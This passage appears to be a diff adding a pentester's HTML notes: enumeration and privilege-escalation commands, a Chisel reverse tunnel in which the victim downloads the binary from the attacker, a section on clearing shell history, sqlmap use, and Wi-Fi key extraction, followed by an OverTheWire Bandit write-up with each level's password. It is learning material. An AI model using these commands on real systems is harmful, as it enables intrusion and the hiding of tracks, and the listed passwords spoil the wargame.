+<pre><code class="language-bash">whoami # Display the username associated with the current effective UID.
+who -a # Display information about all connected users.
+</code></pre>
+<pre><code class="language-bash">ip a # shows (IPv4 or IPv6) addresses on a device.
+iptables -L  # List all firewall rules.
+# displays the routing table
+ip r
+netstat -r
+# displays systems information
+uname -a
+</code></pre>
+<pre><code class="language-bash">ps aux
+# List packages matching given pattern.
+dpkg -l &lt;pattern&gt; list | grep installed
+</code></pre>
+<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
+<pre><code class="language-shell">ipconfig /all
+ipconfig /displaydns
+netstat -bnao
+netstat -r
+
+net view
+net view /domain
+net user /domain
+net user %username% /domain
+net accounts
+net localgroup administrators
+net group &quot;Domain controllers&quot; /domain
+net share
+</code></pre>
+<h2 id="linux-privilege-escalation"><a class="header" href="#linux-privilege-escalation">Linux Privilege Escalation</a></h2>
+<pre><code class="language-bash">sudo -l # checks current privileges
+cat /etc/sudoers.d/[filename]
+
+netstat -ltupn # listening ports
+ss -tulw # listening ports
+
+cat /etc/crontab # checks cronjob
+</code></pre>
+<h3 id="find"><a class="header" href="#find">FIND</a></h3>
+<pre><code class="language-bash">find / -iname &quot;*config*.php&quot; 2&gt;/dev/null # looking for config files - cat [filename] | grep -i &quot;db_&quot;
+find / -user root -perm -u=s 2&gt;/dev/null # Find all files/dirs that are owned by root and have at least the SUID permission
+
+find / -group [name] 2&gt;/dev/null # Find all files/dirs owned by a group
+find / -user [username] 2&gt;/dev/null # Find all files/dirs owned by a user
+
+-perm 444 # exactly readable by everyone
+-perm /444 # only readable by everyone
+
+-exec [command] [option] {}\; 2&gt;/dev/null # {} corresponds to the files returned by the find command
+</code></pre>
+<h3 id="capabilities"><a class="header" href="#capabilities">Capabilities</a></h3>
+<pre><code class="language-bash">getcap -r / 2&gt;/dev/null # scan the system for capabilities.
+</code></pre>
+<h3 id="grep"><a class="header" href="#grep">GREP</a></h3>
+<pre><code class="language-bash">grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; # grep ip addresses from your output.
+grep -rni &quot;somethingToLookFor&quot; / 2&gt;/dev/null
+</code></pre>
+<h2 id="port-forwarding"><a class="header" href="#port-forwarding">Port forwarding</a></h2>
+<p><strong><a href="https://github.com/jpillora/chisel">Using Chisel</a></strong></p>
+<pre><code class="language-bash"># on the attacker
+cd /path/where/chisel/is # binary file
+updog # or any other command to setup an http server
+
+# on the victim
+wget IP:PORT/chisel
+chmod +x chisel # set it executable
+
+# on the attacker
+chisel server --reverse --port 9002 # port forwarding
+
+# on the victim
+./chisel client YOUR_IP:9002 R:9001:[redirectedIP]:[redirectedPort]
+
+# Now you have access on the attacker's machine to : localhost:9001
+</code></pre>
+<p><strong>Using SSH</strong></p>
+<pre><code class="language-bash">ssh -N user@[IP_distant] -L [@_redirection_machine]:[port_redirection]:[IP_redirigee]:[port_redirige]
+</code></pre>
+<p>Example:</p>
+<pre><code class="language-bash">ssh -N user@10.10.10.10 -L 127.07.0.1:4441:192.168.0.100:80
+</code></pre>
+<p>On the <code>10.10.10.10</code> machine, <code>user</code> is running a web server on its <code>192.168.0.100:80</code> interface. Here, we're redirecting to the <code>127.0.0.1</code> address and port 4441. So from the browser, http://127.0.0.1:4441 is reachable. By specifying a proxy on <code>172.17.0.2:4440</code>, it is possible to modify the requests on Burpsuite if needed.</p>
+<h3 id="automated-scripts-for-linux-privesc"><a class="header" href="#automated-scripts-for-linux-privesc">Automated scripts for linux privesc</a></h3>
+<p><strong><a href="https://github.com/diego-treitos/linux-smart-enumeration">LSE - linux-smart-enumeration</a></strong></p>
+<pre><code class="language-bash">wget &quot;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&quot; -O lse.sh;chmod 700 lse.sh
+
+curl &quot;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&quot; -Lo lse.sh;chmod 700 lse.sh
+</code></pre>
+<p><strong><a href="https://github.com/mzet-/linux-exploit-suggester">LES - linux-exploit-suggester</a></strong></p>
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh;chmod 700 les.sh
+</code></pre>
+<p><strong><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></strong></p>
+<pre><code class="language-bash">curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -Lo lPEAS.sh;chmod 700 lPEAS.sh
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="clearing-tracks"><a class="header" href="#clearing-tracks">Clearing Tracks</a></h1>
+<h2 id="basic-shell-commands"><a class="header" href="#basic-shell-commands">Basic shell commands</a></h2>
+<pre><code class="language-bash">history -c # c=clean: clears the history for the current shell
+echo &gt; ~/.bash_history # deletes the content of the user .bash_history
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="useful-commands"><a class="header" href="#useful-commands">Useful commands</a></h1>
+<h2 id="http-serverone-line"><a class="header" href="#http-serverone-line">HTTP ServerOne line</a></h2>
+<pre><code class="language-bash">python -m SimpleHTTPServer 8000 # Python 2.x
+
+python -m http.server 8000 # Python 3.x
+
+updog # pretty interface
+</code></pre>
+<h2 id="steganography"><a class="header" href="#steganography">Steganography</a></h2>
+<p>Find images information</p>
+<pre><code class="language-bash">identify -verbose
+pngcheck [image]
+zsteg [image] # detects stegano data hidden in PNG &amp; BMP
+
+
+steghide extract -sf [filename]
+stegseek [file] [wordlist] # bruteforce steghide passphrase
+</code></pre>
+<h2 id="web-1"><a class="header" href="#web-1">Web</a></h2>
+<h3 id="attaque-sql"><a class="header" href="#attaque-sql">Attaque SQL</a></h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://172.16.128.39:8080/student_grade/index.php?student_id=&quot; --tables -D Dysto_School -T student
+</code></pre>
+<h3 id="website-request-command-line"><a class="header" href="#website-request-command-line">Website request command line</a></h3>
+<pre><code class="language-bash">curl -v [url]
+curl -v -X POST [url]
+wget [url]
+</code></pre>
+<hr />
+<h2 id="forensic-investigation"><a class="header" href="#forensic-investigation">Forensic Investigation</a></h2>
+<pre><code class="language-bash">volatility
+testdisk
+</code></pre>
+<h3 id="hidden-files-extraction"><a class="header" href="#hidden-files-extraction">Hidden files extraction</a></h3>
+<pre><code class="language-bash">binwalk -e
+</code></pre>
+<h2 id="windows-1"><a class="header" href="#windows-1">Windows</a></h2>
+<p>Find the Wi-Fi password using CMD</p>
+<pre><code class="language-bash">netsh wlan show profile &lt;ESSID&gt; key=clear
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="bandit"><a class="header" href="#bandit">Bandit</a></h1>
+<p>My WU of the Bandit wargame from overthewire. The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames.</p>
+<h3 id="level-0"><a class="header" href="#level-0">Level 0</a></h3>
+<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is <code>bandit.labs.overthewire.org</code>, on port <code>2220</code>. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p>
+<pre><code class="language-sh">ssh bandit0@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution"><a class="header" href="#solution">Solution</a></h4>
+<pre><code class="language-sh">cat readme
+</code></pre>
+<p><strong><code>boJ9jbbUNNfktd78OOpsqOltutMc3MY1</code></strong></p>
+<h3 id="level-1"><a class="header" href="#level-1">Level 1</a></h3>
+<p>The password for the next level is stored in a file called <code>-</code> located in the home directory</p>
+<pre><code class="language-sh">ssh bandit1@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-1"><a class="header" href="#solution-1">Solution</a></h4>
+<p>Using <code>-</code> as a filename to mean stdin/stdout is a convention that a lot of programs use. It is not a special property of the filename. The kernel does not recognise <code>-</code> as special so any system calls referring to <code>-</code> as a filename will use <code>-</code> literally as the filename.</p>
+<p>With bash redirection, <code>-</code> is not recognised as a special filename, so bash will use that as the literal filename.</p>
+<p>When cat sees the string <code>-</code> as a filename, it treats it as a synonym for stdin. To get around this, you need to alter the string that cat sees in such a way that it still refers to a file called <code>-</code>. The usual way of doing this is to prefix the filename with a path  <code>./-</code>, or <code>/home/username/-</code>. This technique is also used to get around similar issues where command line options clash with filenames, so a file referred to as <code>./-e</code> does not appear as the -e command line option to a program, for example.</p>
+<pre><code class="language-sh">cat /home/bandit1/-
+</code></pre>
+<p><strong><code>CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</code></strong></p>
+<h3 id="level-2"><a class="header" href="#level-2">Level 2</a></h3>
+<p>The password for the next level is stored in a file called <code>spaces in this filename</code> in this filename located in the home directory</p>
+<pre><code class="language-sh">ssh bandit2@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-2"><a class="header" href="#solution-2">Solution</a></h4>
+<pre><code class="language-sh">cat spaces\ in\ this\ filename
+</code></pre>
+<p><strong><code>UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</code></strong></p>
+<h3 id="level-3"><a class="header" href="#level-3">Level 3</a></h3>
+<p>The password for the next level is stored in a hidden file in the <code>inhere</code> directory.</p>
+<pre><code class="language-sh">ssh bandit3@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-3"><a class="header" href="#solution-3">Solution</a></h4>
+<pre><code class="language-sh">cat inhere/.hidden
+</code></pre>
+<p><strong><code>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</code></strong></p>
+<h3 id="level-4"><a class="header" href="#level-4">Level 4</a></h3>
+<p>The password for the next level is stored in the only <code>human-readable</code> file in the <code>inhere</code> directory. Tip: if your terminal is messed up, try the <code>reset</code> command.</p>
+<pre><code class="language-sh">ssh bandit4@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-4"><a class="header" href="#solution-4">Solution</a></h4>
+<pre><code class="language-sh">file inhere/*
+
+inhere/-file00: data
+inhere/-file01: data
+inhere/-file02: data
+inhere/-file03: data
+inhere/-file04: data
+inhere/-file05: data
+inhere/-file06: data
+inhere/-file07: ASCII text
+inhere/-file08: data
+inhere/-file09: data
+
+cat inhere/-file07
+</code></pre>
+<p><strong><code>koReBOKuIDDepwhWk7jZC0RTdopnAYKh</code></strong></p>
+<h3 id="level-5"><a class="header" href="#level-5">Level 5</a></h3>
+<p>The password for the next level is stored in a file somewhere under the <code>inhere</code> directory and has all of the following properties:</p>
+<ul>
+<li>human-readable</li>
+<li>1033 bytes in size</li>
+<li>not executable</li>
+</ul>
+<pre><code class="language-sh">ssh bandit5@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-5"><a class="header" href="#solution-5">Solution</a></h4>
+<pre><code class="language-sh">find . -readable -size 1033c ! -executable
+
+./inhere/maybehere07/.file2
+
+
+cat ./inhere/maybehere07/.file2
+</code></pre>
+<p><strong><code>DXjZPULLxYr17uwoI01bNLQbtFemEgo7</code></strong></p>
+<h3 id="level-6"><a class="header" href="#level-6">Level 6</a></h3>
+<p>The password for the next level is stored somewhere on the server and has all of the following properties:</p>
+<ul>
+<li>owned by user bandit7</li>
+<li>owned by group bandit6</li>
+<li>33 bytes in size</li>
+</ul>
+<pre><code class="language-sh">ssh bandit6@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-6"><a class="header" href="#solution-6">Solution</a></h4>
+<pre><code class="language-sh">find / -user bandit7 -group bandit6 -size 33c
+
+# Lots of files for which you don't have read rights (except one)
+
+cat /var/lib/dpkg/info/bandit7.password
+</code></pre>
+<p><strong><code>HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</code></strong></p>
+<h3 id="level-7"><a class="header" href="#level-7">Level 7</a></h3>
+<p>The password for the next level is stored in the file <code>data.txt</code> next to the word <code>millionth</code></p>
+<pre><code class="language-sh">ssh bandit7@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-7"><a class="header" href="#solution-7">Solution</a></h4>
+<pre><code class="language-sh">cat data.txt | grep millionth
+</code></pre>
+<p><strong><code>cvX2JJa4CFALtqS87jk27qwqGhBM9plV</code></strong></p>
+<h3 id="level-8"><a class="header" href="#level-8">Level 8</a></h3>
+<p>The password for the next level is stored in the file <code>data.txt</code> and is the only line of text that occurs only once</p>
+<pre><code class="language-sh">ssh bandit8@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-8"><a class="header" href="#solution-8">Solution</a></h4>
+<pre><code class="language-sh">sort data.txt | uniq --unique
+</code></pre>
+<p><strong><code>UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</code></strong></p>
+<h3 id="level-9"><a class="header" href="#level-9">Level 9</a></h3>
+<p>The password for the next level is stored in the file <code>data.txt</code> in one of the few human-readable strings, beginning with several <code>=</code> characters.</p>
+<pre><code class="language-sh">ssh bandit9@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-9"><a class="header" href="#solution-9">Solution</a></h4>
+<pre><code class="language-sh">strings data.txt | grep =
+</code></pre>
+<p><strong><code>truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</code></strong></p>
+<h3 id="level-10"><a class="header" href="#level-10">Level 10</a></h3>
+<p>The password for the next level is stored in the file <code>data.txt</code>, which contains base64 encoded data</p>
+<pre><code class="language-sh">ssh bandit10@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-10"><a class="header" href="#solution-10">Solution</a></h4>
+<pre><code class="language-sh">cat data.txt | base64 -d
+</code></pre>
+<p><strong><code>IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</code></strong></p>
+<h3 id="level-11"><a class="header" href="#level-11">Level 11</a></h3>
+<p>The password for the next level is stored in the file <code>data.txt</code>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>
+<pre><code class="language-sh">ssh bandit11@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-11"><a class="header" href="#solution-11">Solution</a></h4>
+<pre><code class="language-sh">cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+</code></pre>
+<p><strong><code>5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</code></strong></p>
+<h3 id="level-12"><a class="header" href="#level-12">Level 12</a></h3>
+<p>The password for the next level is stored in the file <code>data.txt</code>, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under <code>/tmp</code> in which you can work using <code>mkdir</code>. For example: <code>mkdir /tmp/myname123</code>. Then copy the <code>datafile</code> using <code>cp</code>, and rename it using <code>mv</code> (read the manpages!)</p>
+<pre><code class="language-sh">ssh bandit12@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-12"><a class="header" href="#solution-12">Solution</a></h4>
+<pre><code class="language-sh">cd $(mktemp -d)
+
+cp ~/data.txt .
+
+# the base file is a hexdump. We can reverse the process.
+
+xxd -r data.txt &gt; bandit
+
+# Then just check with the `file` command which file you currently have and use the commands accordingly.
+
+# files compressed in `gzip` format can be extracted with `gunzip`. But you need the `gz` extension (so you should think about renaming `mv`).
+
+gunzip [filename]
+
+# compressed files in `bzip2` format can be decompressed with the following command:
+
+bzip2 -d [filename] # -d =&gt; decompress
+
+# tar archives
+
+tar xvf [filename]
+</code></pre>
+<p><strong><code>8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</code></strong></p>
+<h3 id="level-13"><a class="header" href="#level-13">Level 13</a></h3>
+<p>The password for the next level is stored in <code>/etc/bandit_pass/bandit14</code> and can only be read by user <code>bandit14</code>. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on.</p>
+<pre><code class="language-sh">ssh bandit13@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-13"><a class="header" href="#solution-13">Solution</a></h4>
+<p>we find the file <code>sshkey.private</code> so we can ssh into the localhost as user 'bandit14' and with the private key.</p>
+<pre><code class="language-sh">ssh -i sshkey.private bandit14@localhost
+
+cat /etc/bandit_pass/bandit14
+</code></pre>
+<p><strong><code>4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</code></strong></p>
+<h3 id="level-14"><a class="header" href="#level-14">Level 14</a></h3>
+<p>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.</p>
+<pre><code class="language-sh">ssh bandit14@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-14"><a class="header" href="#solution-14">Solution</a></h4>
+<pre><code class="language-sh">echo &quot;4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e&quot; | nc localhost 30000
+</code></pre>
+<p><strong><code>BfMYroe26WYalil77FoDi9qh59eK5xNr</code></strong></p>
+<h3 id="level-15"><a class="header" href="#level-15">Level 15</a></h3>
+<p>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.</p>
+<p>Helpful note: Getting <code>HEARTBEATING</code> and <code>Read R BLOCK</code>? Use -ign_eof and read the <code>CONNECTED COMMANDS</code> section in the manpage. Next to <code>R</code> and <code>Q</code>, the <code>B</code> command also works in this version of that command…</p>
+<pre><code class="language-sh">ssh bandit15@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-15"><a class="header" href="#solution-15">Solution</a></h4>
+<pre><code class="language-sh">echo &quot;BfMYroe26WYalil77FoDi9qh59eK5xNr&quot; | openssl s_client -ign_eof -connect localhost:30001
+</code></pre>
+<p><strong><code>cluFn7wTiGryunymYOu4RcffSxQluehd</code></strong></p>
+<h3 id="level-16"><a class="header" href="#level-16">Level 16</a></h3>
+<p>The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>
+<pre><code class="language-sh">ssh bandit16@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-16"><a class="header" href="#solution-16">Solution</a></h4>
+<p>We look for open ports.</p>
+<pre><code class="language-sh">nmap -p- localhost
+
+# We logs in to find the password.
+
+openssl s_client -ign_eof -connect localhost:31790
+</code></pre>
+<p>You need to reset the password for the current challenge and you get an ssh key. Which we save as <code>bandit17.key</code>.</p>
+<h3 id="level-17"><a class="header" href="#level-17">Level 17</a></h3>
+<p>There are 2 files in the home directory: <code>passwords.old</code> and <code>passwords.new</code>. The password for the next level is in <code>passwords.new</code> and is the only line that has been changed between <code>passwords.old</code> and <code>passwords.new</code></p>
+<p>NOTE: if you have solved this level and see <code>Byebye!</code> when trying to log into bandit18, this is related to the next level, bandit19</p>
+<pre><code class="language-sh">ssh bandit17@bandit.labs.overthewire.org -p 2220 -i bandit17.key
+</code></pre>
+<h4 id="solution-17"><a class="header" href="#solution-17">Solution</a></h4>
+<pre><code class="language-sh">diff passwords.old passwords.new
+</code></pre>
+<p><strong><code>kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</code></strong></p>
+<h3 id="level-18"><a class="header" href="#level-18">Level 18</a></h3>
+<p>The password for the next level is stored in a file readme in the home directory. Unfortunately, someone has modified <code>.bashrc</code> to log you out when you log in with SSH.</p>
+<pre><code class="language-sh">ssh bandit18@bandit.labs.overthewire.org -p 2220 &quot;cat readme&quot;
+</code></pre>
+<h4 id="solution-18"><a class="header" href="#solution-18">Solution</a></h4>
+<p>The password is retrieved directly with the login command.</p>
+<p><strong><code>IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</code></strong></p>
+<h3 id="level-19"><a class="header" href="#level-19">Level 19</a></h3>
+<p>To gain access to the next level, you should use the <code>setuid</code> binary in the home directory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place <code>/etc/bandit_pass</code>, after you have used the <code>setuid</code> binary.</p>
+<pre><code class="language-sh">ssh bandit19@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-19"><a class="header" href="#solution-19">Solution</a></h4>
+<p>We have a file to run and we pass it a command to retrieve the password of bandit20.</p>
+<pre><code class="language-sh">./bandit20-do cat /etc/bandit_pass/bandit20
+</code></pre>
+<p><strong><code>GbKksEFF4yrVs6il55v6gwY5aVje5f0j</code></strong></p>
+<h3 id="level-20"><a class="header" href="#level-20">Level 20</a></h3>
+<p>There is a <code>setuid</code> binary in the home directory that does the following: it makes a connection to localhost on the port you specify as a command line argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
+<pre><code class="language-sh">ssh bandit20@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-20"><a class="header" href="#solution-20">Solution</a></h4>
+<p>You need to open a listening port in TCP.</p>
+<pre><code class="language-sh">echo &quot;GbKksEFF4yrVs6il55v6gwY5aVje5f0j&quot; | nc -l localhost -p 61254 &amp;
+
+./suconnect 61254
+
+
+# Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+# Password matches, sending next password
+</code></pre>
+<p><strong><code>gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</code></strong></p>
+<h3 id="level-21"><a class="header" href="#level-21">Level 21</a></h3>
+<p>A program is running automatically at regular intervals from <code>cron</code>, the time-based job scheduler. Look in <code>/etc/cron.d/</code> for the configuration and see what command is being executed.</p>
+<pre><code class="language-sh">ssh bandit21@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-21"><a class="header" href="#solution-21">Solution</a></h4>
+<pre><code class="language-sh">ls /etc/cron.d
+
+# atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+
+cat cronjob_bandit22
+
+#    @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+#    * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+
+
+cat /usr/bin/cronjob_bandit22.sh
+
+#   #!/bin/bash
+#   chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+#   cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+</code></pre>
+<p><strong><code>Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</code></strong></p>
+<h3 id="level-22"><a class="header" href="#level-22">Level 22</a></h3>
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in <code>/etc/cron.d/</code> for the configuration and see what command is being executed.</p>
+<p>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>
+<pre><code class="language-sh">ssh bandit22@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-22"><a class="header" href="#solution-22">Solution</a></h4>
+<pre><code class="language-sh">cat /etc/cron.d/cronjob_bandit23
+
+#    @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+#    * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+
+cat /usr/bin/cronjob_bandit23.sh
+
+#    #!/bin/bash
+#    myname=$(whoami)
+#    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+#    echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;
+
+#    cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
+
+$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+
+# -bash: 8ca319486bfbbc3663ea0fbe81326349: command not found
+
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+</code></pre>
+<p><strong><code>jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</code></strong></p>
+<h3 id="level-23"><a class="header" href="#level-23">Level 23</a></h3>
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in <code>/etc/cron.d/</code> for the configuration and see what command is being executed.</p>
+<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
+<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
+<pre><code class="language-sh">ssh bandit23@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-23"><a class="header" href="#solution-23">Solution</a></h4>
+<pre><code class="language-sh">cd $(mktemp -d)
+
+# /tmp/tmp.vqqZkF0eeo
+
+touch test.sh
+touch pass
+chmod 777 test.sh
+chmod 666 pass
+
+vi test.sh
+
+#    #!/bin/bash
+#    cat /etc/bandit_pass_bandit24 &gt; /tmp/tmp.vqqZkF0eeo/pass
+
+# (Wait a minute)
+
+cat password
+</code></pre>
+<p><strong><code>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code></strong></p>
+<h3 id="level-24"><a class="header" href="#level-24">Level 24</a></h3>
+<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
+<pre><code class="language-sh">ssh bandit24@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-24"><a class="header" href="#solution-24">Solution</a></h4>
+<pre><code class="language-sh">cd $(mktemp -d)
+</code></pre>
+<pre><code class="language-python">import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 30002))
+s.recv(1024)
+for i in range(1000):
+    print('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {0:04}'.format(i))
+    data = &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {0:04}&quot;.format(i)+&quot;\n&quot;
+    s.sendall(data.encode())
+    response = s.recv(1024).decode()
+    print(response)
+    if(&quot;Wrong&quot; in response):
+        print('ok')
+    else:
+        print(&quot;Got it &quot;, i)
+        break
+s.close()
+</code></pre>
+<p><strong><code>uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</code></strong></p>
+<h3 id="level-25"><a class="header" href="#level-25">Level 25</a></h3>
+<p>Logging in to bandit26 from bandit25 should be fairly easy... The shell for user bandit26 is not <code>/bin/bash</code>, but something else. Find out what it is, how it works and how to break out of it.</p>
+<pre><code class="language-sh">ssh bandit25@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-25"><a class="header" href="#solution-25">Solution</a></h4>
+<p>We connect to bandit 25 and get the ssh key from bandit 26.
+We can connect to bandit 26.
+But first we look at the following file through bandit 25</p>
+<pre><code class="language-sh">cat /etc/passwd
+
+# bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+</code></pre>
+<p>We look into <code>/usr/bin/showtext</code></p>
+<pre><code>#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0
+</code></pre>
+<p>We are in the <code>sh</code> shell and the more command is executed from the start to see the <code>~/text.txt</code> file.</p>
+<p>We now connect to bandit 26.</p>
+<pre><code class="language-sh">ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
+</code></pre>
+<p>At the connection, we see:</p>
+<p><img src="ctf-write-up/over-the-wire/bandit/img/bandit26.png" alt="bandit26" /></p>
+<p>We do the same thing again but reduce the size of our terminal so that the <code>more</code> command is effective.</p>
+<p><img src="ctf-write-up/over-the-wire/bandit/img/bandit26_more.png" alt="bandit26_more" /></p>
+<p>To enter edit mode in <code>more</code>, you type <code>v</code>.
+This uses <code>vi</code>. Enter the command</p>
+<pre><code class="language-sh">:e /etc/bandit_pass/bandit26
+</code></pre>
+<p><strong><code>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</code></strong></p>
+<h3 id="level-26"><a class="header" href="#level-26">Level 26</a></h3>
+<p>Good job getting a shell! Now hurry and grab the password for bandit27!</p>
+<pre><code class="language-sh">ssh bandit26@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-26"><a class="header" href="#solution-26">Solution</a></h4>
+<p>As before, we connect to bandit 26 with a small terminal. Switch to <code>v</code> edit mode. Enter the command.</p>
+<pre><code class="language-sh">:set shell=/bin/bash
+
+:shell
+
+# We finally get a shell in `vi` which allows us to run any command we want.
+
+cat /etc/bandit_pass/bandit27
+</code></pre>
+<p><strong><code>3ba3118a22e93127a4ed485be72ef5ea</code></strong></p>
+<h3 id="level-27"><a class="header" href="#level-27">Level 27</a></h3>
+<p>There is a git repository at <code>ssh://bandit27-git@localhost/home/bandit27-git/repo</code>. The password for the user bandit27-git is the same as for the user bandit27.</p>
+<p>Clone the repository and find the password for the next level.</p>
+<pre><code class="language-sh">ssh bandit27@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-27"><a class="header" href="#solution-27">Solution</a></h4>
+<pre><code class="language-sh">cd $(mktemp -d)
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cat README
+</code></pre>
+<p><strong><code>0ef186ac70e04ea33b4c1853d2526fa2</code></strong></p>
+<h3 id="level-28"><a class="header" href="#level-28">Level 28</a></h3>
+<p>There is a git repository at <code>ssh://bandit28-git@localhost/home/bandit28-git/repo</code>. The password for the user bandit28-git is the same as for the user bandit28.</p>
+<p>Clone the repository and find the password for the next level.</p>
+<pre><code class="language-sh">ssh bandit28@bandit.labs.overthewire.org -p 2220
+</code></pre>
+<h4 id="solution-28"><a class="header" href="#solution-28">Solution</a></h4>
+<pre><code class="language-sh">cd $(mktemp -d)
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+git log
+
+#    commit 073c27c130e6ee407e12faad1dd3848a110c4f95
+#    Author: Morla Porla &lt;morla@overthewire.org&gt;
+#    Date:   Tue Oct 16 14:00:39 2018 +0200
+
+#        fix info leak
+
+#    commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
